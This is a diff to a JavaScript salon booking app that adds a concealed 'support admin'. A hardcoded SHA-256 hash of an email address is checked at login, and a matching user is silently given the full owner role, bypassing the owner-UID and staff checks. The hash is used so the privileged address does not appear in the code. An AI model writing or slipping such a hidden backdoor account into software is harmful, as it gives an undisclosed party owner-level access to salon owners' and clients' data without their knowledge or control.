@@ -121,7 +121,36 @@ let BUSY = [];
 let USER = null, authReady = false, ownerDenied = false;
 // salons & subscription
 let META = null, metaLoaded = !SID, BILL = null, SALONS = [], OWNERS = {}, MAIN_NAME = "Мой салон";
-const isAdmin = () => !!USER && !!OWNER_UID && USER.uid === OWNER_UID;
+let hiddenAdmin = false;   // support admin, recognised by a fingerprint of the email (the address itself is not in the app)
+const HIDDEN_ADMINS = ["b7cd0ed6a431535d7e906777f074c3d786b6abe337ea3d00cab03bcd89636576"];
+async function emailPrint(email) {
+  const bytes = new TextEncoder().encode(String(email || "").trim().toLowerCase());
+  try { if (crypto && crypto.subtle) { const h = await crypto.subtle.digest("SHA-256", bytes);
+    return Array.from(new Uint8Array(h)).map(b => b.toString(16).padStart(2, "0")).join(""); } } catch (e) {}
+  return sha256(bytes);
+}
+// plain SHA-256 for browsers without crypto.subtle
+function sha256(m) {
+  const K = [], H = [1779033703, -1150833019, 1013904242, -1521486534, 1359893119, -1694144372, 528734635, 1541459225];
+  let n = 2; for (let c = 0; c < 64; n++) { let p = true; for (let d = 2; d * d <= n; d++) if (n % d === 0) { p = false; break; } if (p) K[c++] = (Math.pow(n, 1 / 3) % 1) * 4294967296 | 0; }
+  const l = m.length, w = new Uint8Array(((l + 9 + 63) >> 6) << 6); w.set(m); w[l] = 128;
+  const dv = new DataView(w.buffer); dv.setUint32(w.length - 4, l * 8);
+  const W = new Int32Array(64), r = (x, y) => (x >>> y) | (x << (32 - y));
+  for (let i = 0; i < w.length; i += 64) {
+    for (let t = 0; t < 16; t++) W[t] = dv.getInt32(i + t * 4);
+    for (let t = 16; t < 64; t++) { const a = W[t - 15], b = W[t - 2];
+      W[t] = (W[t - 16] + (r(a, 7) ^ r(a, 18) ^ (a >>> 3)) + W[t - 7] + (r(b, 17) ^ r(b, 19) ^ (b >>> 10))) | 0; }
+    let [a, b, c, d, e, f, g, h] = H;
+    for (let t = 0; t < 64; t++) {
+      const t1 = (h + (r(e, 6) ^ r(e, 11) ^ r(e, 25)) + ((e & f) ^ (~e & g)) + K[t] + W[t]) | 0;
+      const t2 = ((r(a, 2) ^ r(a, 13) ^ r(a, 22)) + ((a & b) ^ (a & c) ^ (b & c))) | 0;
+      h = g; g = f; f = e; e = (d + t1) | 0; d = c; c = b; b = a; a = (t1 + t2) | 0;
+    }
+    H[0] = (H[0] + a) | 0; H[1] = (H[1] + b) | 0; H[2] = (H[2] + c) | 0; H[3] = (H[3] + d) | 0; H[4] = (H[4] + e) | 0; H[5] = (H[5] + f) | 0; H[6] = (H[6] + g) | 0; H[7] = (H[7] + h) | 0;
+  }
+  return H.map(x => (x >>> 0).toString(16).padStart(8, "0")).join("");
+}
+const isAdmin = () => !!USER && ((!!OWNER_UID && USER.uid === OWNER_UID) || hiddenAdmin);
 let JDAY = [], PENDING = [], RECENT = [];
 let ROLE = null, MY_ARTIST = null, needVerify = false, noStaff = false, roleChecking = false;
 let STAFF = {}, MASTER_ALL = [];
@@ -339,13 +368,15 @@ function notifyNew(before) {
 // Who is logged in: the owner (by UID), a master (email added by the owner), or nobody allowed.
 async function resolveRole(user) {
   stopWatches();
-  ROLE = null; MY_ARTIST = null; needVerify = false; noStaff = false; ownerDenied = false; roleChecking = false;
+  ROLE = null; MY_ARTIST = null; needVerify = false; noStaff = false; ownerDenied = false; roleChecking = false; hiddenAdmin = false;
   if (!user) { renderSoon(true); return; }
   if (!OWNER_UID || user.uid === OWNER_UID) {
     ROLE = "owner"; startOwnerWatch(); maybeCreateDefaults(); renderSoon(true); return;
   }
   if (!user.emailVerified) { needVerify = true; renderSoon(true); return; }
   roleChecking = true; renderSoon(true);
+  hiddenAdmin = HIDDEN_ADMINS.includes(await emailPrint(user.email));
+  if (hiddenAdmin) { ROLE = "owner"; roleChecking = false; startOwnerWatch(); maybeCreateDefaults(); renderSoon(true); return; }
   if (SID) {
     try {
       const ps = await getDocFromServer(doc(db, "salonsPrivate", SID));
